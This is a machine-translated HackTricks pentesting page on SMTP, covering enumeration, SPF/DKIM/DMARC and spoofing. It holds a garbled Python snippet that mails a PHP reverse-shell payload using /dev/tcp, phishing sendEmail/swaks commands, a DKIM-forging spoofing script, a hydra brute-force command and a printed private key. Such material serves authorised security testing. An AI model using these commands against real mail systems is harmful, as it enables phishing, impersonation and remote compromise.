# 25,465,587 - Pentesting SMTP/s

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Instantno dostupno pode코avanje za procenu ranjivosti i testiranje proboja**. Pokrenite kompletan pentest od bilo kog mesta sa 20+ alata i funkcija koje idu od izvi캠anja do izve코tavanja. Mi ne zamenjujemo pentestere - mi razvijamo prilago캠ene alate, module za detekciju i eksploataciju kako bismo im vratili ne코to vremena da dublje kopaju, otvaraju ljuske i zabavljaju se.

{% embed url="https://pentest-tools.com/" %}

## **Osnovne informacije**

**Simple Mail Transfer Protocol (SMTP)** je protokol koji se koristi unutar TCP/IP paketa za **slanje i primanje e-po코te**. Zbog svojih ograni캜enja u 캜ekanju poruka na strani primaoca, SMTP se 캜esto koristi zajedno sa **POP3 ili IMAP**. Ovi dodatni protokoli omogu캖avaju korisnicima da skladi코te poruke na serveru po코tanskog sandu캜eta i da ih periodi캜no preuzimaju.

U praksi, uobi캜ajeno je da **programi za e-po코tu** koriste **SMTP za slanje e-po코te**, dok koriste **POP3 ili IMAP za primanje**. Na sistemima zasnovanim na Unix-u, **sendmail** se isti캜e kao SMTP server koji se naj캜e코캖e koristi u svrhu e-po코te. Komercijalni paket poznat kao Sendmail obuhvata POP3 server. Nadalje, **Microsoft Exchange** pru쬬 SMTP server i nudi opciju uklju캜ivanja podr코ke za POP3.

**Podrazumevani port:** 25,465(ssl),587(ssl)

```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```

### EMAIL Zaglavlja

Ako imate priliku da **naterate rtvu da vam po코alje email** (putem kontakt forme na veb stranici na primer), u캜inite to jer **mo쬰te saznati o unutra코njoj topologiji** rtve gledaju캖i zaglavlja mejla.

Tako캠e mo쬰te dobiti email sa SMTP servera poku코avaju캖i **poslati tom serveru email na nepostoje캖u adresu** (jer 캖e server poslati napada캜u NDN email). Ali, budite sigurni da 코aljete email sa dozvoljene adrese (proverite SPF politiku) i da mo쬰te primati NDN poruke.

Trebalo bi tako캠e da poku코ate **poslati razli캜ite sadr쬬je jer mo쬰te prona캖i interesantne informacije** u zaglavljima kao 코to su: `X-Virus-Scanned: by av.domain.com`\
Trebalo bi da po코aljete EICAR test fajl.\
Otkrivanje **AV** mo쬰 vam omogu캖iti iskori코캖avanje **poznatih ranjivosti.**

## Osnovne radnje

### **Banner Grabbing/Osnovna konekcija**

**SMTP:**

```bash
nc -vn <IP> 25
```

**SMTPS**:

**SMTPS (Secure SMTP)** je sigurna verzija protokola SMTP koja koristi SSL/TLS enkripciju za za코titu komunikacije. Kada vr코ite testiranje penetracije SMTPS servera, mo쬰te iskoristiti alate poput `smtp-user-enum` za prepoznavanje va쬰캖ih korisni캜kih naloga, `Nmap` za skeniranje otvorenih portova i `Metasploit` za ispitivanje ranjivosti.

```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```

### Pronala쬰nje MX servera organizacije

```bash
dig +short mx google.com
```

### Enumeracija

```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```

### NTLM Auth - Otkrivanje informacija

Ako server podr쬬va NTLM autentikaciju (Windows), mo쬰te dobiti osetljive informacije (verzije). Vi코e informacija [**ovde**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666).

```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```

Ili **automatizujte** ovo pomo캖u **nmap** dodatka `smtp-ntlm-info.nse`

### Interno ime servera - Otkrivanje informacija

Neke SMTP servere automatski popunjavaju adresu po코iljaoca kada se izda komanda "MAIL FROM" bez potpune adrese, otkrivaju캖i njegovo interno ime:

```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```

### Snifovanje

Proverite da li ste snifovali neku lozinku iz paketa ka portu 25

### [Bruteforce autentikacije](../../generic-methodologies-and-resources/brute-force.md#smtp)

## Enumeracija Brute Force Korisni캜kog Imena

**Autentikacija nije uvek potrebna**

### RCPT TO

```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```

### VRFY

VRFY komanda se koristi za potvrdu da li korisni캜ko ime ili adresa e-po코te postoji na SMTP serveru. Ova komanda mo쬰 biti iskori코캖ena od strane napada캜a za prikupljanje validnih korisni캜kih imena ili adresa e-po코te koje se mogu koristiti za dalje napade poput social engineeringa ili brute force napada na 코ifre. Kako bi se za코titili od ovakvih napada, preporu캜uje se da se VRFY komanda onemogu캖i na SMTP serverima.

```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```

### EXPN

### EXPN

```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```

### Automatski alati

```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Trenutno dostupno pode코avanje za procenu ranjivosti i testiranje proboja**. Pokrenite pun pentest sa vi코e od 20 alatki i funkcija koje idu od rekonstrukcije do izve코tavanja. Mi ne zamenjujemo pentestere - mi razvijamo prilago캠ene alatke, module za otkrivanje i eksploataciju kako bismo im vratili neko vreme da dublje kopaju, otvaraju ljuske i zabavljaju se.

{% embed url="https://pentest-tools.com/" %}

## DSN Izve코taji

**Izve코taji o obave코tenju o statusu isporuke**: Ako po코aljete **email** organizaciji na **neva쬰캖u adresu**, organizacija 캖e vas obavestiti da je adresa neva쬰캖a slanjem **povratnog mejla vama**. **Zaglavlja** vra캖enog mejla 캖e **sadr쬬ti** mogu캖e **osetljive informacije** (kao 코to su IP adresa mail servisa koji su interaktovali sa izve코tajima ili informacije o antivirusnom softveru).

## [Komande](smtp-commands.md)

### Slanje emaila iz Linux konzole

```bash
sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u "Important subject" -a /tmp/malware.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

<phishing message>
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```

### Slanje email-a pomo캖u Python-a

<details>

<summary>Python kod ovde</summary>

\`\`\`python from email.mime.multipart import MIMEMultipart from email.mime.text import MIMEText import smtplib import sys

lhost = "127.0.0.1" lport = 443 rhost = "192.168.1.1" rport = 25 # 489,587

## create message object instance

msg = MIMEMultipart()

## setup the parameters of the message

password = "" msg\['From'] = "attacker@local" msg\['To'] = "victim@local" msg\['Subject'] = "This is not a drill!"

## payload

message = ("& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("\[\*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain')) server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()\[0] != 250: print("\[-]Connection Error") exit()

server.starttls()

## Uncomment if log-in with authencation

## server.login(msg\['From'], password)

server.sendmail(msg\['From'], msg\['To'], msg.as\_string()) server.quit()

print("\[\*\*\*]successfully sent email to %s:" % (msg\['To']))

````
</details>

## SMTP Smuggling

Ranjivost SMTP transporta omogu캖ila je zaobila쬰nje svih SMTP za코tita (proverite slede캖i odeljak za vi코e informacija o za코titama). Za vi코e informacija o SMTP transportu pogledajte:

<div data-gb-custom-block data-tag="content-ref" data-url='smtp-smuggling.md'>

[smtp-smuggling.md](smtp-smuggling.md)

</div>

## Mera protiv la쬹og slanja e-po코te

Organizacije su spre캜ene da neovla코캖eno 코alju e-po코tu u njihovo ime kori코캖enjem **SPF**, **DKIM** i **DMARC** zbog jednostavnosti la쬴ranja SMTP poruka.

**Potpuni vodi캜 za ove mere** dostupan je na [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/).

### SPF

<div data-gb-custom-block data-tag="hint" data-style='danger'>

SPF je "zastareo" 2014. godine. To zna캜i da umesto kreiranja **TXT zapisa** u `_spf.domain.com`, kreirate ga u `domain.com` koriste캖i **isti sintaksu**.\
Osim toga, da biste ponovo koristili prethodne SPF zapise, 캜esto je uobi캜ajeno prona캖i ne코to poput `"v=spf1 include:_spf.google.com ~all"`

</div>

**Sender Policy Framework** (SPF) je mehanizam koji omogu캖ava Mail Transfer Agents (MTA) da provere da li je host koji 코alje e-po코tu ovla코캖en tako 코to upita listu ovla코캖enih po코tanskih servera definisanih od strane organizacija. Ova lista, koja specificira IP adrese/opsege, domene i druge entitete **ovla코캖ene da 코alju e-po코tu u ime imena domena**, uklju캜uje razli캜ite "**Mehanizme**" u SPF zapisu.

#### Mehanizmi

Sa [Vikipedije](https://en.wikipedia.org/wiki/Sender\_Policy\_Framework):

| Mehanizam | Opis                                                                                                                                                                                                                                                                                                                         |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | Uvek se podudara; koristi se za podrazumevani rezultat poput `-all` za sve IP adrese koje nisu podudarne sa prethodnim mehanizmima.                                                                                                                                                                                                                                  |
| A         | Ako domen ima adresni zapis (A ili AAAA) koji se mo쬰 re코iti na adresu po코iljaoca, podudara캖e se.                                                                                                                                                                                                                   |
| IP4       | Ako je po코iljalac u datom IPv4 opsegu adresa, podudara se.                                                                                                                                                                                                                                                                              |
| IP6       | Ako je po코iljalac u datom IPv6 opsegu adresa, podudara se.                                                                                                                                                                                                                                                                              |
| MX        | Ako domen ima MX zapis koji se re코ava na adresu po코iljaoca, podudara캖e se (tj. po코ta dolazi sa jednog od dolaznih po코tanskih servera domena).                                                                                                                                                                          |
| PTR       | Ako je ime domena (PTR zapis) za adresu klijenta u datom domenu i to ime domena se re코ava na adresu klijenta (provera obrnutog DNS-a), podudara se. Ovaj mehanizam se ne preporu캜uje i treba ga izbegavati, ako je mogu캖e.                                                                                     |
| EXISTS    | Ako dato ime domena vodi ka bilo kojoj adresi, podudara se (bez obzira na adresu na koju se re코ava). Ovo se retko koristi. Uz SPF makro jezik nudi slo쬰nije podudaranje poput DNSBL-upita.                                                                                                                           |
| INCLUDE   | Referenca na politiku drugog domena. Ako politika tog domena pro캠e, ovaj mehanizam prolazi. Me캠utim, ako uklju캜ena politika ne uspe, obrada se nastavlja. Da bi se potpuno delegiralo politici drugog domena, mora se koristiti pro코irenje preusmeravanja.                                                                                     |
| REDIRECT  | <p>Preusmeravanje je pokaziva캜 na drugo ime domena koje hostuje SPF politiku, omogu캖ava vi코e domena da dele istu SPF politiku. Korisno je kada radite sa velikim brojem domena koji dele istu infrastrukturu e-po코te.</p><p>SPF politika domena nazna캜ena u mehanizmu preusmeravanja 캖e biti kori코캖ena.</p> |

Tako캠e je mogu캖e identifikovati **Kvalifikatore** koji ukazuju **코ta treba uraditi ako se mehanizam podudara**. Podrazumevano se koristi **kvalifikator "+"** (tako da ako se podudara bilo koji mehanizam, to zna캜i da je dozvoljeno).\
Obi캜no 캖ete primetiti **na kraju svake SPF politike** ne코to poput: **\~all** ili **-all**. Ovo se koristi da bi se nazna캜ilo da **ako po코iljalac ne odgovara nijednoj SPF politici, trebalo bi ozna캜iti e-po코tu kao nepoverljivu (\~) ili odbiti (-) e-po코tu.**

#### Kvalifikatori

Svaki mehanizam unutar politike mo쬰 biti prefiksan jednim od 캜etiri kvalifikatora kako bi se definisao 쬰ljeni rezultat:

* **`+`**: Odgovara rezultatu PROLAZ. Podrazumevano, mehanizmi pretpostavljaju ovaj kvalifikator, 캜ine캖i `+mx` ekvivalentnim `mx`.
* **`?`**: Predstavlja NEUTRALAN rezultat, tretiran sli캜no kao NIKO (bez specifi캜ne politike).
* **`~`**: Ozna캜ava SOFTFAIL, slu쬰캖i kao srednje re코enje izme캠u NEUTRALNO i NEUSPEH. E-poruke koje zadovolje ovaj rezultat obi캜no se prihvataju ali se ozna캜avaju prema tome.
* **`-`**: Ozna캜ava NEUSPEH, sugeri코u캖i da bi e-po코ta trebalo direktno odbiti.

U slede캖em primeru, **SPF politika google.com** je ilustrovana. Obratite pa쬹ju na uklju캜ivanje SPF politika iz razli캜itih domena unutar prve SPF politike:
```shell-session
dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
````

Tradicionalno je bilo mogu캖e la쬴rati bilo koje ime domena koje nije imalo ta캜an/nijedan SPF zapis. **Danas**, ako **e-po코ta dolazi sa domena bez validnog SPF zapisa**, verovatno 캖e biti **odbijena/ozna캜ena kao nepoverljiva automatski**.

Da biste proverili SPF domena, mo쬰te koristiti online alate poput: [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

#### DKIM (DomainKeys Identified Mail)

DKIM se koristi za potpisivanje odlaznih e-po코ta, omogu캖avaju캖i njihovu validaciju od strane spoljnih Mail Transfer Agents (MTA) putem dobijanja javnog klju캜a domena iz DNS-a. Taj javni klju캜 se nalazi u TXT zapisu domena. Da biste pristupili ovom klju캜u, morate znati i selektor i ime domena.

Na primer, zahtev za klju캜em, ime domena i selektor su neophodni. Oni se mogu prona캖i u zaglavlju e-po코te `DKIM-Signature`, npr. `d=gmail.com;s=20120113`.

Komanda za dobijanje ovih informacija mo쬰 izgledati ovako:

```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
# This command would return something like:
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```

#### DMARC (Domain-based Message Authentication, Reporting & Conformance)

DMARC pobolj코ava sigurnost e-po코te grade캖i na SPF i DKIM protokolima. On defini코e politike koje vode mail servere u rukovanju e-po코tom sa odre캠ene domene, uklju캜uju캖i kako postupati sa autentifikacionim gre코kama i gde slati izve코taje o akcijama obrade e-po코te.

**Da biste dobili DMARC zapis, morate upitati poddomen \_dmarc**

```bash
# Reject
dig _dmarc.facebook.com txt | grep DMARC
_dmarc.facebook.com.	3600	IN	TXT	"v=DMARC1; p=reject; rua=mailto:a@dmarc.facebookmail.com; ruf=mailto:fb-dmarc@datafeeds.phishlabs.com; pct=100"

# Quarantine
dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com.	300	IN	TXT	"v=DMARC1; p=quarantine; rua=mailto:mailauth-reports@google.com"

# None
dig _dmarc.bing.com txt | grep DMARC
_dmarc.bing.com.	3600	IN	TXT	"v=DMARC1; p=none; pct=100; rua=mailto:BingEmailDMARC@microsoft.com;"
```

**DMARC oznake**

#### **맚a je sa Poddomenima?**

**Od** [**ovde**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**.**\
Morate imati odvojene SPF zapise za svaki poddomen sa kog 쬰lite da 코aljete po코tu.\
Slede캖e je originalno objavljeno na openspf.org, koji je nekada bio odli캜an resurs za ovu vrstu informacija.

Pitanje Demona: 맚a je sa poddomenima?

Ako dobijem po코tu sa pielovers.demon.co.uk, i nema SPF podataka za pielovers, da li treba da se vratim jedan nivo unazad i testiram SPF za demon.co.uk? Ne. Svaki poddomen na Demonu je druga캜iji korisnik, i svaki korisnik mo쬰 imati svoju politiku. Ne bi imalo smisla da se politika Demona automatski primenjuje na sve svoje korisnike; ako Demon 쬰li to da uradi, mo쬰 postaviti SPF zapise za svaki poddomen.

Dakle, savet izdava캜ima SPF-a je slede캖i: trebalo bi da dodate SPF zapis za svaki poddomen ili ime hosta koje ima A ili MX zapis.

Sajtovi sa wildcard A ili MX zapisima tako캠e treba da imaju wildcard SPF zapis, u obliku: \* IN TXT "v=spf1 -all"

Ovo ima smisla - poddomen mo쬰 biti u potpuno druga캜ijoj geografskoj lokaciji i imati potpuno druga캜iju definiciju SPF-a.

#### **Otvoreni Relej**

Prilikom slanja emailova, va쬹o je osigurati da ne budu ozna캜eni kao spam. Ovo se 캜esto posti쬰 kori코캖enjem **relejnog servera koji je poveren od strane primaoca**. Me캠utim, 캜est izazov je 코to administratori mo쬯a nisu potpuno svesni koje **IP opsege je bezbedno dozvoliti**. Ovaj nedostatak razumevanja mo쬰 dovesti do gre코aka prilikom postavljanja SMTP servera, rizik koji se 캜esto identifikuje u bezbednosnim procenama.

Re코enje koje neki administratori koriste kako bi izbegli probleme sa isporukom emailova, posebno u vezi sa komunikacijom sa potencijalnim ili postoje캖im klijentima, je da **dozvole konekcije sa bilo kog IP adrese**. Ovo se posti쬰 konfigurisanjem parametra `mynetworks` SMTP servera da prihvati sve IP adrese, kako je prikazano ispod:

```bash
mynetworks = 0.0.0.0/0
```

Za proveru da li je po코tanski server otvoren relej (코to zna캜i da mo쬰 prosle캠ivati e-po코tu sa bilo kog eksternog izvora), 캜esto se koristi alat `nmap`. On uklju캜uje specifi캜an skript dizajniran za testiranje ovoga. Komanda za sprovo캠enje detaljnog skeniranja servera (na primer, sa IP adresom 10.10.10.10) na portu 25 kori코캖enjem `nmap`-a je:

```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```

#### **Alati**

* [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **Proverite konfiguracije SPF i DMARC**
* [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **Automatski dobijanje SPF i DMARC konfiguracija**

#### Slanje la쬹ih emailova

* [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
* [**http://www.anonymailer.net/**](http://www.anonymailer.net)
* [**https://emkei.cz/**](https://emkei.cz/)

**Ili mo쬰te koristiti alat:**

* [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)

```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```

Ako dobijete bilo kakvu gre코ku prilikom kori코캖enja dkim python lib prilikom parsiranja klju캜a, slobodno koristite slede캖i.\
**NAPOMENA**: Ovo je samo brzo re코enje za obavljanje brzih provera u slu캜ajevima kada iz nekog razloga openssl privatni klju캜 ne mo쬰 da bude parsiran od strane dkim-a.

```
-----BEGIN RSA PRIVATE KEY-----
MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
-----END RSA PRIVATE KEY-----
```

**Ili to mo쬰te uraditi ru캜no:**

<pre class="language-php"><code class="lang-php"><strong># Ovo 캖e poslati nepotpisanu poruku
</strong><strong>mail("vas_email@gmail.com", "Test subjekat!", "hey! Ovo je test", "Od: administrator@victim.com");
</strong></code></pre>



```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```

#### **Vi코e informacija**

**Prona캠ite vi코e informacija o ovim za코titama na** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/)

#### **Drugi indikatori phishinga**

* Starost domena
* Linkovi koji vode ka IP adresama
* Tehnike manipulacije linkova
* Sumnjivi (neobi캜ni) prilozi
* O코te캖en sadr쬬j e-po코te
* Kori코캖enje vrednosti koje se razlikuju od zaglavlja e-po코te
* Postojanje va쬰캖eg i pouzdanog SSL sertifikata
* Slanje stranice na sajtove za filtriranje web sadr쬬ja

### Izfiltracija putem SMTP-a

**Ako mo쬰te slati podatke putem SMTP-a** [**pro캜itajte ovo**](../../generic-methodologies-and-resources/exfiltration.md#smtp)**.**

### Konfiguracioni fajl

#### Postfix

Obi캜no, ako je instaliran, u `/etc/postfix/master.cf` se nalaze **skripte za izvr코avanje** kada se na primer primi nova po코ta od korisnika. Na primer, linija `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}` zna캜i da 캖e se `/etc/postfix/filtering` izvr코iti ako korisnik mark primi novu po코tu.

Drugi konfiguracioni fajlovi:

```
sendmail.cf
submit.cf
```

### Reference

* [https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/](https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/)
* [https://www.reddit.com/r/HowToHack/comments/101it4u/what\_could\_hacker\_do\_with\_misconfigured\_smtp/](https://www.reddit.com/r/HowToHack/comments/101it4u/what\_could\_hacker\_do\_with\_misconfigured\_smtp/)

### HackTricks Automatske Komande

```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```

<img src="../../.gitbook/assets/image (2) (1) (1).png" alt="" data-size="original">

